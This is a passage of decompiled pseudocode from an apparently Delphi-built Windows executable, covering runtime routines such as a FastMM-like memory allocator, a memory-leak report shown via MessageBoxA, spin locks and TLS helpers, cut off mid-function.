__int32 __fastcall sub_402F24(__int32 a1)
{
  __int32 v2; // [esp+0h] [ebp-4h] BYREF

  v2 = a1;
  return _InterlockedExchange(&v2, sub_40B730(&user32_dll_import_table, &MessageBoxA));
}
// 40B730: using guessed type _DWORD __stdcall sub_40B730(_DWORD, _DWORD);
// 472020: using guessed type int user32_dll_import_table;

//----- (00402FAC) --------------------------------------------------------
__int32 __fastcall sub_402FAC(__int32 a1)
{
  __int32 v2; // [esp+0h] [ebp-4h] BYREF

  v2 = a1;
  return _InterlockedExchange(&v2, sub_40B730(&kernel32_dll_import_table, &GetLogicalProcessorInformation));
}
// 40B730: using guessed type _DWORD __stdcall sub_40B730(_DWORD, _DWORD);
// 472000: using guessed type int kernel32_dll_import_table;

//----- (00402FC4) --------------------------------------------------------
int sub_402FC4()
{
  int v0; // ebx
  struct _STARTUPINFOW v2; // [esp+0h] [ebp-48h] BYREF

  v0 = 10;
  v2.cb = 68;
  GetStartupInfoW(&v2);
  if ( (v2.dwFlags & 1) != 0 )
    return v2.wShowWindow;
  return v0;
}

//----- (00403150) --------------------------------------------------------
int __fastcall sub_403150(int result, int a2)
{
  long double v2; // fst7
  long double v3; // fst6
  long double v4; // fst5
  long double v5; // fst4

  v2 = (long double)*(__int64 *)result;
  v3 = (long double)*(__int64 *)(result + 8);
  v4 = (long double)*(__int64 *)(result + 16);
  v5 = (long double)*(__int64 *)(result + 24);
  *(_DWORD *)(a2 + 32) = *(_DWORD *)(result + 32);
  *(_QWORD *)(a2 + 24) = (__int64)v5;
  *(_QWORD *)(a2 + 16) = (__int64)v4;
  *(_QWORD *)(a2 + 8) = (__int64)v3;
  *(_QWORD *)a2 = (__int64)v2;
  return result;
}

//----- (004032CC) --------------------------------------------------------
int sub_4032CC()
{
  int result; // eax

  if ( byte_469055 )
  {
    while ( 1 )
    {
      result = (unsigned __int8)_InterlockedCompareExchange8(&byte_469AE4, 1, 0);
      if ( !(_BYTE)result )
        break;
      if ( !byte_469985 )
      {
        Sleep(0);
        result = (unsigned __int8)_InterlockedCompareExchange8(&byte_469AE4, 1, 0);
        if ( !(_BYTE)result )
          return result;
        Sleep(0xAu);
      }
    }
  }
  return result;
}
// 469055: using guessed type char byte_469055;
// 469985: using guessed type char byte_469985;
// 469AE4: using guessed type char byte_469AE4;

//----- (00403424) --------------------------------------------------------
int __fastcall sub_403424(int a1)
{
  _DWORD *v2; // eax
  _DWORD *v3; // ecx
  int result; // eax

  System::_16475();
  v2 = VirtualAlloc(0, 0x13FFF0u, 0x1000u, 4u);
  if ( v2 )
  {
    v3 = (_DWORD *)dword_469AD8;
    *v2 = &dword_469AD4;
    dword_469AD8 = (int)v2;
    v2[1] = v3;
    *v3 = v2;
    v2[327675] = 2;
    dword_469AEC = 1310688 - a1;
    result = (int)v2 - a1 + 1310704;
    dword_469AE8 = result;
    *(_DWORD *)(result - 4) = a1 | 2;
  }
  else
  {
    dword_469AEC = 0;
    return 0;
  }
  return result;
}
// 4033B8: using guessed type int System::_16475(void);
// 469AD4: using guessed type int dword_469AD4;
// 469AD8: using guessed type int dword_469AD8;
// 469AE8: using guessed type int dword_469AE8;
// 469AEC: using guessed type int dword_469AEC;

//----- (004034A0) --------------------------------------------------------
int sub_4034A0()
{
  int result; // eax

  if ( byte_469055 )
  {
    while ( 1 )
    {
      result = (unsigned __int8)_InterlockedCompareExchange8(&byte_46BB74, 1, 0);
      if ( !(_BYTE)result )
        break;
      if ( !byte_469985 )
      {
        Sleep(0);
        result = (unsigned __int8)_InterlockedCompareExchange8(&byte_46BB74, 1, 0);
        if ( !(_BYTE)result )
          return result;
        Sleep(0xAu);
      }
    }
  }
  return result;
}
// 469055: using guessed type char byte_469055;
// 469985: using guessed type char byte_469985;
// 46BB74: using guessed type char byte_46BB74;

//----- (004035F4) --------------------------------------------------------
unsigned int __fastcall sub_4035F4(unsigned int a1, unsigned int a2)
{
  int v4; // eax
  unsigned int v5; // ebx
  unsigned int v6; // ebp
  unsigned int RegionSize; // ebx
  unsigned int v8; // eax
  unsigned int Mem; // ebx
  void *lpAddress; // [esp+0h] [ebp-30h]
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+4h] [ebp-2Ch] BYREF

  v4 = *(_DWORD *)(a1 - 4);
  v5 = (v4 & 0xFFFFFFF0) - 20;
  if ( v5 >= a2 )
  {
    if ( a2 < v5 >> 1 )
    {
      Mem = System::SysGetMem(a2);
      if ( Mem )
      {
        if ( a2 > 0x40A2C )
          *(_DWORD *)(a1 - 16 + 8) = a2;
        System::_16470(a1, Mem, a2);
        sub_403AC4(a1);
      }
    }
    else
    {
      Mem = a1;
      *(_DWORD *)(a1 - 16 + 8) = a2;
    }
  }
  else
  {
    if ( v5 + (v5 >> 2) <= a2 )
      v6 = a2;
    else
      v6 = v5 + (v5 >> 2);
    lpAddress = (void *)((v4 & 0xFFFFFFF0) + a1 - 16);
    VirtualQuery(lpAddress, &Buffer, 0x1Cu);
    if ( Buffer.State != 0x10000 )
      goto LABEL_12;
    Buffer.RegionSize &= 0xFFFF0000;
    if ( a2 - v5 >= Buffer.RegionSize )
      goto LABEL_12;
    RegionSize = (v6 - v5 + 0xFFFF) & 0xFFFF0000;
    if ( Buffer.RegionSize < RegionSize )
      RegionSize = Buffer.RegionSize;
    if ( VirtualAlloc(lpAddress, RegionSize, 0x2000u, 4u) && VirtualAlloc(lpAddress, RegionSize, 0x1000u, 4u) )
    {
      v8 = a1 - 16;
      *(_DWORD *)(v8 + 8) = a2;
      *(_DWORD *)(v8 + 12) = (*(_DWORD *)(a1 - 16 + 12) + RegionSize) | 8;
      return a1;
    }
    else
    {
LABEL_12:
      Mem = System::SysGetMem(v6);
      if ( Mem )
      {
        if ( v6 > 0x40A2C )
          *(_DWORD *)(Mem - 16 + 8) = a2;
        System::_16469(a1, Mem, *(_DWORD *)(a1 - 16 + 8));
        sub_403AC4(a1);
      }
    }
  }
  return Mem;
}
// 403228: using guessed type int __fastcall System::_16469(_DWORD, _DWORD, _DWORD);
// 403258: using guessed type int __fastcall System::_16470(_DWORD, _DWORD, _DWORD);

//----- (00403AC4) --------------------------------------------------------
int __fastcall sub_403AC4(unsigned int a1)
{
  unsigned int v1; // edx
  unsigned int v2; // ecx
  char v3; // bl
  int v4; // ebx
  bool v5; // zf
  int v6; // eax
  int result; // eax
  int v8; // ecx
  int v9; // eax
  int v10; // ecx
  unsigned int v11; // ebx
  unsigned int v12; // esi
  int v13; // ecx
  unsigned int v14; // eax
  unsigned int v15; // ecx
  unsigned int v16; // ecx
  int *v17; // esi
  int v18; // eax
  _DWORD *v19; // edx
  _DWORD *v20; // [esp-8h] [ebp-Ch]
  unsigned int v21; // [esp-4h] [ebp-8h]

  v1 = *(_DWORD *)(a1 - 4);
  v2 = a1;
  v3 = byte_469055;
  if ( (v1 & 7) != 0 )
  {
    if ( (v1 & 5) != 0 )
    {
      if ( (v1 & 3) != 0 )
        return -1;
      else
        return System::_16480();
    }
  }
  else
  {
    v4 = *(_DWORD *)v1;
    if ( byte_469055 )
    {
      while ( _InterlockedCompareExchange8((volatile signed __int8 *)v4, 1, 0) )
      {
        _mm_pause();
        if ( !byte_469985 )
        {
          v21 = v2;
          v20 = (_DWORD *)v1;
          Sleep(0);
          v1 = (unsigned int)v20;
          v2 = v21;
          if ( !_InterlockedCompareExchange8((volatile signed __int8 *)v4, 1, 0) )
            break;
          Sleep(0xAu);
          v1 = (unsigned int)v20;
          v2 = v21;
        }
      }
    }
    v5 = (*(_DWORD *)(v1 + 20))-- == 1;
    v6 = *(_DWORD *)(v1 + 16);
    if ( !v5 )
    {
      *(_DWORD *)(v1 + 16) = v2;
      *(_DWORD *)(v2 - 4) = v6 + 1;
      if ( v6 )
      {
        result = 0;
        *(_BYTE *)v4 = 0;
      }
      else
      {
        v8 = *(_DWORD *)(v4 + 8);
        *(_DWORD *)(v1 + 12) = v4;
        *(_DWORD *)(v1 + 8) = v8;
        *(_DWORD *)(v8 + 12) = v1;
        *(_DWORD *)(v4 + 8) = v1;
        *(_BYTE *)v4 = 0;
        return 0;
      }
      return result;
    }
    if ( !v6
      || (v9 = *(_DWORD *)(v1 + 12),
          v10 = *(_DWORD *)(v1 + 8),
          *(_DWORD *)(v9 + 8) = v10,
          *(_DWORD *)(v10 + 12) = v9,
          v6 = 0,
          *(_DWORD *)(v4 + 24) == v1) )
    {
      *(_DWORD *)(v4 + 20) = v6;
    }
    *(_BYTE *)v4 = v6;
    a1 = v1;
    v1 = *(_DWORD *)(v1 - 4);
    v3 = byte_469055;
  }
  v5 = v3 == 0;
  v11 = v1 & 0xFFFFFFF0;
  v12 = a1;
  if ( !v5 )
  {
    while ( _InterlockedCompareExchange8(&byte_469AE4, 1, 0) )
    {
      _mm_pause();
      if ( !byte_469985 )
      {
        Sleep(0);
        if ( !_InterlockedCompareExchange8(&byte_469AE4, 1, 0) )
          break;
        Sleep(0xAu);
      }
    }
  }
  v13 = *(_DWORD *)(v11 + v12 - 4);
  if ( (v13 & 1) != 0 )
  {
    v14 = v11 + v12;
    v15 = v13 & 0xFFFFFFF0;
    v11 += v15;
    if ( v15 >= 0xB30 )
      System::_16473(v14);
  }
  else
  {
    *(_DWORD *)(v11 + v12 - 4) = v13 | 8;
  }
  if ( (*(_BYTE *)(v12 - 4) & 8) != 0 )
  {
    v16 = *(_DWORD *)(v12 - 8);
    v12 -= v16;
    v11 += v16;
    if ( v16 >= 0xB30 )
      System::_16473(v12);
  }
  if ( v11 == 1310688 )
  {
    if ( dword_469AEC == 1310688 )
    {
      v17 = (int *)(v12 - 16);
      v18 = *v17;
      v19 = (_DWORD *)v17[1];
      *(_DWORD *)(v18 + 4) = v19;
      *v19 = v18;
      byte_469AE4 = 0;
      return -!VirtualFree(v17, 0, 0x8000u);
    }
    else
    {
      System::_16475();
      *(_DWORD *)(v12 + 1310684) = 2;
      dword_469AEC = 1310688;
      dword_469AE8 = v12 + 1310688;
      byte_469AE4 = 0;
      return 0;
    }
  }
  else
  {
    *(_DWORD *)(v12 - 4) = v11 + 3;
    *(_DWORD *)(v11 + v12 - 8) = v11;
    System::_16474(v12, v11);
    byte_469AE4 = 0;
    return 0;
  }
}
// 403318: using guessed type int __fastcall System::_16473(_DWORD);
// 403358: using guessed type int __fastcall System::_16474(_DWORD, _DWORD);
// 4033B8: using guessed type int System::_16475(void);
// 403550: using guessed type int System::_16480(void);
// 469055: using guessed type char byte_469055;
// 469985: using guessed type char byte_469985;
// 469AE4: using guessed type char byte_469AE4;
// 469AE8: using guessed type int dword_469AE8;
// 469AEC: using guessed type int dword_469AEC;

//----- (00403FD4) --------------------------------------------------------
int __fastcall sub_403FD4(int a1)
{
  unsigned int v1; // ebx
  int result; // eax
  int v3; // ecx
  int *v4; // edx
  unsigned int v5; // ebx
  int v6; // ebx

  v1 = (a1 - 1) & 0xFFFFFFFC;
  result = System::SysGetMem(a1);
  v3 = -(result == 0);
  v4 = (int *)(v1 + result);
  v5 = v3 | v1;
  if ( v5 < 0x40A2C )
  {
    v6 = -v5;
    do
    {
      *(double *)((char *)v4 + v6) = 0.0;
      v6 += 8;
    }
    while ( v6 < 0 );
    *v4 = v3;
    __asm
    {
      ffree   st
      fincstp
    }
  }
  return result;
}

//----- (00404008) --------------------------------------------------------
int __fastcall sub_404008(LPCSTR lpText, LPCSTR lpCaption, DWORD a3)
{
  HANDLE StdHandle; // eax
  HANDLE v6; // eax
  HANDLE v7; // eax
  LPCVOID v9; // [esp-10h] [ebp-1Ch]
  int v10; // [esp-Ch] [ebp-18h]
  int v11; // [esp-Ch] [ebp-18h]
  int v12; // [esp-Ch] [ebp-18h]
  DWORD NumberOfBytesWritten; // [esp+0h] [ebp-Ch] BYREF

  NumberOfBytesWritten = a3;
  if ( !byte_469054 )
    return MessageBoxA(0, lpText, lpCaption, 0x2010u);
  v10 = sub_407110((int)lpCaption);
  StdHandle = GetStdHandle(0xFFFFFFF4);
  WriteFile_0(StdHandle, lpCaption, v10, &NumberOfBytesWritten, 0);
  v11 = sub_407110((int)lpBuffer);
  v9 = lpBuffer;
  v6 = GetStdHandle(0xFFFFFFF4);
  WriteFile_0(v6, v9, v11, &NumberOfBytesWritten, 0);
  v12 = sub_407110((int)lpText);
  v7 = GetStdHandle(0xFFFFFFF4);
  return WriteFile_0(v7, lpText, v12, &NumberOfBytesWritten, 0);
}
// 469054: using guessed type char byte_469054;

//----- (004040F0) --------------------------------------------------------
int __fastcall sub_4040F0(int *a1, _DWORD *a2, int *a3)
{
  int v3; // edx
  int v4; // ebx
  int result; // eax

  *a2 = a1 + 8;
  v3 = *a1;
  if ( a1 == *(int **)(*a1 + 24) && *(_DWORD *)(v3 + 16) <= *(_DWORD *)(v3 + 20) )
  {
    result = *(_DWORD *)(v3 + 16) - 1;
    *a3 = result;
  }
  else
  {
    v4 = (int)a1 + (*(a1 - 1) & 0xFFFFFFF0);
    result = *(unsigned __int16 *)(v3 + 2);
    *a3 = v4 - result;
  }
  return result;
}

//----- (0040412C) --------------------------------------------------------
int __fastcall sub_40412C(unsigned int a1, void *a2)
{
  int v4; // esi
  char v5; // di
  char v7[36]; // [esp+0h] [ebp-24h] BYREF

  v4 = 0;
  do
  {
    v5 = a1;
    a1 /= 0xAu;
    ++v4;
    v7[20 - v4] = v5 - 10 * a1 + 48;
  }
  while ( a1 );
  System::Move(&v7[20 - v4], a2, v4);
  return (int)a2 + v4;
}
// 40412C: using guessed type char var_24[36];

//----- (00404194) --------------------------------------------------------
int __fastcall sub_404194(int a1, void *a2)
{
  int v4; // eax

  if ( a1 )
    return unknown_libname_25(*(_DWORD *)(a1 - 56) + 1, a2, **(unsigned __int8 **)(a1 - 56));
  v4 = sub_407110(off_465064);
  return unknown_libname_25(off_465064, a2, v4);
}

//----- (004041C8) --------------------------------------------------------
bool __usercall sub_4041C8@<al>(LPCVOID lpAddress@<eax>, int a2)
{
  unsigned int v2; // edx

  if ( (unsigned int)lpAddress <= 0xFFFF || ((unsigned __int8)lpAddress & 3) != 0 )
    return 0;
  v2 = *(_DWORD *)(a2 - 28);
  if ( v2 > (unsigned int)lpAddress || *(_DWORD *)(a2 - 16) + v2 < (unsigned int)lpAddress + 4 )
  {
    *(_DWORD *)(a2 - 16) = 0;
    VirtualQuery(lpAddress, (PMEMORY_BASIC_INFORMATION)(a2 - 28), 0x1Cu);
  }
  return *(_DWORD *)(a2 - 16) >= 4u
      && *(_DWORD *)(a2 - 12) == 4096
      && (*(_BYTE *)(a2 - 8) & 0xF6) != 0
      && (*(_BYTE *)(a2 - 7) & 1) == 0;
}

//----- (00404240) --------------------------------------------------------
bool __usercall sub_404240@<al>(int a1@<eax>, int a2@<edx>, int a3)
{
  const void *v4; // esi

  if ( a2 >= 1000 || !sub_4041C8((LPCVOID)(a1 - 88), a3) || !sub_4041C8((LPCVOID)(a1 - 48), a3) )
    return 0;
  v4 = *(const void **)(a1 - 48);
  return a1 == *(_DWORD *)(a1 - 88) && (!v4 || sub_4041C8(v4, a3) && (unsigned __int8)sub_404240(a3));
}

//----- (004042E8) --------------------------------------------------------
bool sub_4042E8()
{
  if ( byte_469055 )
  {
    while ( _InterlockedCompareExchange8(&byte_46BB8C, 1, 0) )
    {
      if ( !byte_469985 )
      {
        Sleep(0);
        if ( !_InterlockedCompareExchange8(&byte_46BB8C, 1, 0) )
          break;
        Sleep(0xAu);
      }
    }
  }
  if ( !lpAddress )
    lpAddress = VirtualAlloc(0, 0x10000u, 0x1000u, 4u);
  return lpAddress != 0;
}
// 469055: using guessed type char byte_469055;
// 469985: using guessed type char byte_469985;
// 46BB8C: using guessed type char byte_46BB8C;

//----- (004043F4) --------------------------------------------------------
void *__usercall sub_4043F4@<eax>(int *a1@<eax>, int a2)
{
  unsigned int v2; // esi
  int i; // ebx
  int v4; // eax
  bool v5; // al
  bool v6; // al
  void *result; // eax
  int v8; // [esp+Ch] [ebp-28h]
  int v9; // [esp+Ch] [ebp-28h]
  unsigned int v10; // [esp+10h] [ebp-24h] BYREF
  void *v11; // [esp+14h] [ebp-20h] BYREF
  bool v12; // [esp+1Bh] [ebp-19h]
  _WORD *v13; // [esp+1Ch] [ebp-18h]
  _BYTE *v14; // [esp+20h] [ebp-14h]
  int v15; // [esp+24h] [ebp-10h]
  int v16; // [esp+28h] [ebp-Ch]
  int *v17; // [esp+30h] [ebp-4h]

  v17 = a1;
  v2 = a2 + ((unsigned int)(*a1 - (_DWORD)&unk_465078) >> 5 << 11) - 112640;
  sub_4040F0(a1, &v11, (int *)&v10);
  while ( 1 )
  {
    result = v11;
    if ( (unsigned int)v11 > v10 )
      break;
    if ( (*((char *)v11 - 4) & 1) == 0 && !(unsigned __int8)System::SysUnregisterExpectedMemoryLeak(v11) )
    {
      *(_BYTE *)(a2 - 112641) = 0;
      i = 0;
      v4 = System::_16493(v11);
      if ( v4 )
      {
        for ( i = 3; i <= 255; ++i )
        {
          if ( v4 == *(_DWORD *)(v2 + 8 * i) )
            break;
          if ( !*(_DWORD *)(v2 + 8 * i) )
            break;
        }
        if ( i > 255 )
          i = 0;
        else
          *(_DWORD *)(v2 + 8 * i) = v4;
      }
      else if ( *((int *)v11 + 1) < 256 )
      {
        v16 = *((_DWORD *)v11 + 2);
        v15 = *((unsigned __int16 *)v11 + 1);
        if ( (v15 == 1 || v15 == 2) && v16 > 0 && (*(unsigned __int16 *)(*v17 + 2) - 16) / v15 > v16 )
        {
          v12 = 1;
          if ( v15 == 1 )
          {
            v14 = (char *)v11 + 12;
            v8 = v16;
            do
            {
              v5 = v12 && *v14 >= 0x20u;
              v12 = v5;
              ++v14;
              --v8;
            }
            while ( v8 );
            if ( v12 && !*v14 )
              i = 1;
          }
          else
          {
            v13 = (char *)v11 + 12;
            v9 = v16;
            do
            {
              v6 = v12 && *v13 >= 0x20u;
              v12 = v6;
              ++v13;
              --v9;
            }
            while ( v9 );
            if ( v12 && !*v13 )
              i = 2;
          }
        }
      }
      ++*(_DWORD *)(v2 + 8 * i + 4);
    }
    v11 = (char *)v11 + *(unsigned __int16 *)(*v17 + 2);
  }
  return result;
}
// 4044DC: conditional instruction was optimized away because %var_C.4>=1
// 404527: conditional instruction was optimized away because %var_C.4>=1
// 4042C0: using guessed type int __fastcall System::_16493(_DWORD);

//----- (004045B0) --------------------------------------------------------
int sub_4045B0()
{
  int result; // eax
  int *i; // edi
  int *j; // ebx
  int v3; // esi
  int *k; // ebx
  int v5; // eax
  char *v6; // ebx
  int v7; // edi
  unsigned int *v8; // esi
  int v9; // eax
  _BYTE *v10; // ebx
  _BYTE *v11; // eax
  void *v12; // ebx
  int v13; // eax
  void *v14; // ebx
  _BYTE *v15; // ebx
  int v16; // eax
  int v17; // eax
  int v18; // eax
  _BYTE *v19; // ebx
  _BYTE *v20; // ebx
  _BYTE *v21; // ebx
  int v22; // eax
  int v23; // esi
  int v24; // edi
  _BYTE *v25; // ebx
  int v26; // eax
  DWORD v27; // ecx
  CHAR Text[30719]; // [esp+0h] [ebp-27824h] BYREF
  char v29[2049]; // [esp+77FFh] [ebp-20025h] BYREF
  int v30[4096]; // [esp+8000h] [ebp-1F824h] BYREF
  unsigned int *v31; // [esp+C000h] [ebp-1B824h]
  unsigned __int16 *v32; // [esp+C004h] [ebp-1B820h]
  int v33; // [esp+C008h] [ebp-1B81Ch]
  int v34; // [esp+C00Ch] [ebp-1B818h]
  unsigned int v35; // [esp+C010h] [ebp-1B814h]
  int v36; // [esp+C014h] [ebp-1B810h]
  char v37; // [esp+C01Ah] [ebp-1B80Ah]
  char v38; // [esp+C01Bh] [ebp-1B809h]
  int v39; // [esp+C01Ch] [ebp-1B808h]
  char v40; // [esp+C023h] [ebp-1B801h]
  __int16 v41[1022]; // [esp+C024h] [ebp-1B800h] BYREF
  char v42; // [esp+C820h] [ebp-1B004h] BYREF
  int savedregs; // [esp+27824h] [ebp+0h] BYREF

  sub_4051B8(Text, 0x8000, 0);
  sub_4051B8(v41, 112640, 0);
  sub_4051B8(v30, 0x4000, 0);
  result = 0;
  v39 = 0;
  v40 = 1;
  for ( i = (int *)dword_469AD8; i != &dword_469AD4; i = (int *)i[1] )
  {
    result = unknown_libname_24(i);
    for ( j = (int *)result; result; j = (int *)result )
    {
      v3 = *(j - 1);
      if ( (v3 & 1) == 0 )
      {
        if ( (v3 & 4) != 0 )
        {
          sub_4043F4(j, (int)&savedregs);
        }
        else if ( v39 < 4096 )
        {
          v35 = (v3 & 0xFFFFFFF0) - 4;
          if ( !(unsigned __int8)System::SysUnregisterExpectedMemoryLeak(j) )
          {
            v40 = 0;
            v30[v39++] = v35;
          }
        }
      }
      result = unknown_libname_23(j);
    }
  }
  for ( k = (int *)dword_46BB7C; k != &dword_46BB78 && v39 < 4096; k = (int *)k[1] )
  {
    result = System::SysUnregisterExpectedMemoryLeak(k + 4);
    if ( !(_BYTE)result )
    {
      v40 = 0;
      result = v39;
      v30[v39++] = (k[3] & 0xFFFFFFF0) - 20;
    }
  }
  if ( !v40 )
  {
    v38 = 0;
    v34 = 0;
    v5 = sub_407110(off_465054);
    v6 = (char *)unknown_libname_25(off_465054, Text, v5);
    v36 = 55;
    v32 = (unsigned __int16 *)&unk_46507A;
    v31 = (unsigned int *)&v42;
    do
    {
      v33 = *v32 - 4;
      v37 = 0;
      v7 = 255;
      v8 = v31;
      do
      {
        if ( v6 > v29 )
          break;
        if ( *v8 )
        {
          if ( !v38 )
          {
            v9 = sub_407110(off_465058);
            v6 = (char *)unknown_libname_25(off_465058, v6, v9);
            v38 = 1;
          }
          if ( v37 )
          {
            *v6 = 44;
            v15 = v6 + 1;
            *v15 = 32;
            v14 = v15 + 1;
          }
          else
          {
            *v6 = 13;
            v10 = v6 + 1;
            *v10 = 10;
            v11 = (_BYTE *)sub_40412C(v34 + 1, v10 + 1);
            *v11 = 32;
            v11[1] = 45;
            v11[2] = 32;
            v12 = (void *)sub_40412C(v33, v11 + 3);
            v13 = sub_407110(off_465060);
            v14 = (void *)unknown_libname_25(off_465060, v12, v13);
            v37 = 1;
          }
          if ( v7 )
          {
            if ( v7 == 1 )
            {
              v17 = sub_407110(off_465068);
              v19 = (_BYTE *)unknown_libname_25(off_465068, v14, v17);
            }
            else if ( v7 == 2 )
            {
              v18 = sub_407110(off_46506C);
              v19 = (_BYTE *)unknown_libname_25(off_46506C, v14, v18);
            }
            else
            {
              v19 = (_BYTE *)sub_404194(*(v8 - 1), v14);
            }
          }
          else
          {
            v16 = sub_407110(off_465064);
            v19 = (_BYTE *)unknown_libname_25(off_465064, v14, v16);
          }
          *v19 = 32;
          v20 = v19 + 1;
          *v20++ = 120;
          *v20 = 32;
          v6 = (char *)sub_40412C(*v8, v20 + 1);
        }
        --v7;
        v8 -= 2;
      }
      while ( v7 != -1 );
      if ( v37 || !byte_469AD2 || (((_BYTE)v33 + 4) & 0xF) == 0 )
        v34 = v33;
      v31 += 512;
      v32 += 16;
      --v36;
    }
    while ( v36 );
    if ( v39 > 0 )
    {
      if ( v38 )
      {
        *v6 = 13;
        v21 = v6 + 1;
        *v21++ = 10;
        *v21++ = 13;
        *v21 = 10;
        v6 = v21 + 1;
      }
      v22 = sub_407110(off_46505C);
      v6 = (char *)unknown_libname_25(off_46505C, v6, v22);
      v23 = v39;
      v24 = 0;
      v31 = (unsigned int *)v30;
      do
      {
        if ( v24 )
        {
          *v6 = 44;
          v25 = v6 + 1;
          *v25 = 32;
          v6 = v25 + 1;
        }
        v6 = (char *)sub_40412C(*v31, v6);
        if ( v6 > v29 )
          break;
        ++v24;
        ++v31;
        --v23;
      }
      while ( v23 );
    }
    v26 = sub_407110((int)lpBuffer);
    unknown_libname_25((int)lpBuffer, v6, v26);
    return sub_404008(Text, lpCaption, v27);
  }
  return result;
}
// 4049AE: variable 'v27' is possibly undefined
// 40408C: using guessed type int __fastcall unknown_libname_23(_DWORD);
// 4040B0: using guessed type int __fastcall unknown_libname_24(_DWORD);
// 469AD2: using guessed type char byte_469AD2;
// 469AD4: using guessed type int dword_469AD4;
// 469AD8: using guessed type int dword_469AD8;
// 46BB78: using guessed type int dword_46BB78;
// 46BB7C: using guessed type int dword_46BB7C;
// 4045B0: using guessed type __int16 var_1B800[1022];

//----- (00404B4C) --------------------------------------------------------
_DWORD *sub_404B4C()
{
  int v0; // esi
  int (**v1)(); // ebx
  unsigned int v2; // eax
  unsigned int v3; // eax
  unsigned __int16 v4; // di
  unsigned int v5; // ecx
  int v6; // esi
  _DWORD *v7; // edx
  _DWORD *result; // eax

  v0 = 55;
  v1 = &off_465094;
  do
  {
    if ( !*v1 )
      *v1 = System::_16469;
    *(v1 - 4) = (int (*)())(v1 - 7);
    *(v1 - 5) = (int (*)())(v1 - 7);
    *(v1 - 2) = 0;
    *(v1 - 3) = (int (*)())1;
    v2 = ((12 * *((unsigned __int16 *)v1 - 13) + 239) & 0xFFFFFF00) + 48;
    if ( v2 < 0xB30 )
      v2 = 2864;
    v3 = (v2 + 1232) >> 13;
    if ( v3 > 7 )
      LOWORD(v3) = 7;
    *((_BYTE *)v1 - 27) = 255 << v3;
    *((_WORD *)v1 - 12) = ((_WORD)v3 << 13) + 2864;
    v4 = *((_WORD *)v1 - 13);
    v5 = ((48 * v4 + 239) & 0xFFFFFF00) + 48;
    if ( v5 < 0x7330 )
      v5 = 29488;
    if ( v5 > 0xFF30 )
      v5 = 65328;
    *((_WORD *)v1 - 11) = (((v5 - 32) / v4 * v4 + 239) & 0xFF00) + 48;
    v1 += 8;
    --v0;
  }
  while ( v0 );
  unknown_libname_26();
  dword_469AD4 = (int)&dword_469AD4;
  dword_469AD8 = (int)&dword_469AD4;
  v6 = 1024;
  v7 = &unk_469B74;
  do
  {
    result = v7;
    *v7 = v7;
    v7[1] = v7;
    v7 += 2;
    --v6;
  }
  while ( v6 );
  dword_46BB78 = (int)&dword_46BB78;
  dword_46BB7C = (int)&dword_46BB78;
  return result;
}
// 403228: using guessed type int System::_16469();
// 404B08: using guessed type int unknown_libname_26(void);
// 465094: using guessed type int (*off_465094)();
// 469AD4: using guessed type int dword_469AD4;
// 469AD8: using guessed type int dword_469AD8;
// 46BB78: using guessed type int dword_46BB78;
// 46BB7C: using guessed type int dword_46BB7C;

//----- (00404C78) --------------------------------------------------------
BOOL sub_404C78()
{
  int *i; // edi
  int *v1; // ebp
  int v2; // edx
  _DWORD *v3; // eax
  int v4; // edx
  _DWORD *v5; // ecx
  BOOL result; // eax
  int *j; // esi
  int *v8; // edi

  for ( i = (int *)*(&dword_469AD4 + 1); i != &dword_469AD4; i = v1 )
  {
    v1 = (int *)i[1];
    VirtualFree(i, 0, 0x8000u);
  }
  v2 = 55;
  v3 = &unk_465078;
  do
  {
    v3[3] = v3;
    v3[2] = v3;
    v3[4] = 1;
    v3[5] = 0;
    v3 += 8;
    --v2;
  }
  while ( v2 );
  dword_469AD4 = (int)&dword_469AD4;
  *(&dword_469AD4 + 1) = (int)&dword_469AD4;
  v4 = 1024;
  v5 = &unk_469B74;
  do
  {
    *v5 = v5;
    v5[1] = v5;
    v5 += 2;
    --v4;
  }
  while ( v4 );
  dword_469AF0 = 0;
  sub_4051B8(dword_469AF4, 128, 0);
  result = 0;
  dword_469AEC = 0;
  for ( j = (int *)*(&dword_46BB78 + 1); j != &dword_46BB78; j = v8 )
  {
    v8 = (int *)j[1];
    result = VirtualFree(j, 0, 0x8000u);
  }
  dword_46BB78 = (int)&dword_46BB78;
  *(&dword_46BB78 + 1) = (int)&dword_46BB78;
  return result;
}
// 469AD4: using guessed type int dword_469AD4;
// 469AEC: using guessed type int dword_469AEC;
// 469AF0: using guessed type int dword_469AF0;
// 469AF4: using guessed type int dword_469AF4[32];
// 46BB78: using guessed type int dword_46BB78;

//----- (00404E38) --------------------------------------------------------
int sub_404E38()
{
  int v0; // eax
  int v1; // ebx

  v0 = *(_DWORD *)Sysinit::__linkproc__ GetTls();
  if ( !v0 )
    return 0;
  v1 = *(_DWORD *)(v0 + 8);
  *(_DWORD *)(v0 + 8) = 0;
  if ( dword_469028 )
    dword_469028(v1);
  return v1;
}
// 40B790: using guessed type int Sysinit::__linkproc__ GetTls(void);
// 469028: using guessed type int (__fastcall *dword_469028)(_DWORD);

//----- (00404E78) --------------------------------------------------------
void __usercall __noreturn sub_404E78(int a1@<eax>, int a2@<edx>, int a3@<ebx>)
{
  dword_465004 = a2;
  sub_406AA4(a1, a3);
}
// 465004: using guessed type int dword_465004;

//----- (00404ED0) --------------------------------------------------------
void __fastcall __noreturn sub_404ED0(char a1, int a2, int a3)
{
  HIBYTE(a3) = a1;
  unknown_libname_28(a3);
}
// 404E84: using guessed type void __cdecl __noreturn unknown_libname_28(_DWORD);

//----- (00405094) --------------------------------------------------------
unsigned int __fastcall sub_405094(unsigned int result)
{
  if ( dword_469058 )
  {
    result &= 0xFFC0u;
    dword_46502C = result;
    _mm_setcsr(result);
  }
  return result;
}
// 46502C: using guessed type int dword_46502C;
// 469058: using guessed type int dword_469058;

//----- (004050B0) --------------------------------------------------------
int sub_4050B0()
{
  int result; // eax

  result = 0;
  if ( dword_469058 )
    return _mm_getcsr();
  return result;
}
// 469058: using guessed type int dword_469058;

//----- (004050E8) --------------------------------------------------------
void __usercall __noreturn sub_4050E8(int a1@<ebx>)
{
  int retaddr; // [esp+4h] [ebp+4h]

  if ( dword_469038 )
    dword_469038();
  sub_404E78(210, retaddr, a1);
}
// 469038: using guessed type int (*dword_469038)(void);

//----- (004051B8) --------------------------------------------------------
int __fastcall sub_4051B8(_WORD *a1, int a2, __int16 a3)
{
  int v3; // edx
  long double v4; // fst7
  int v5; // ecx
  int v6; // edx
  int result; // eax
  int v8; // edx
  bool v9; // sf
  bool v10; // of

  HIBYTE(a3) = a3;
  if ( a2 < 32 )
  {
